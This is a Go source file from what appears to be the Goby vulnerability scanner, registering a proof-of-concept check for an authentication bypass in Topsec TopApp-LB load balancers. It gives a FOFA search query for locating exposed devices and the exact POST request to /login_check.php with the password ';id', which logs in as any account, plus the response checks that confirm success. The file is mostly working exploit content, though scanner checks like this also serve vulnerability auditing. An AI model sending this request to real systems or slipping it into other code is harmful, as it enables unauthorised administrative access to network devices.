package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Topsec TopAppLB Any account Login",
    "Description": "Any Account can log in to the background.Enter any account on the login page, the password is ;id",
    "Product": "topsec-TopAppLB",
    "Homepage": "http://www.topsec.com.cn/product/31.html",
    "DisclosureDate": "2021-04-06",
    "Author": "SuperDolby",
    "FofaQuery": "title=\"TopApp-LB 负载均衡系统\"",
    "Level": "3",
    "Impact": "Any Account can log in to the background",
    "Recommendation": "",
    "References": [
        "https://www.pwnwiki.org/index.php?title=%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B2%A0%E8%BC%89%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%B8/zh-cn"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login_check.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4251.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": "userName=admin&password=%3Bid"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "redirect.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|admin:;id",
                "vulurl|lastheader|variable|{{{scheme}}}://admin:;id@{{{hostinfo}}}/login_check.php"
            ]
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "topsec-TopAppLB"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6784"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}